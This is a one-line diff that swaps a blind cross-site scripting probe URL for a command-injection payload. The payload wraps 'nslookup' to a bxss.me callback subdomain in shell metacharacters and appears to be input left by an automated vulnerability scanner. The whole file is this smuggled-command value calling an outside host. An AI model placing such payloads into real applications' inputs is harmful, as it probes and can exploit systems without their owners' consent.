@@ -1,1 +1,1 @@
-bxss.me/t/xss.html?%00
+&nslookup -q=cname hitclaccgpqaudf002.bxss.me&'\"`0&nslookup -q=cname hitclaccgpqaudf002.bxss.me&`'
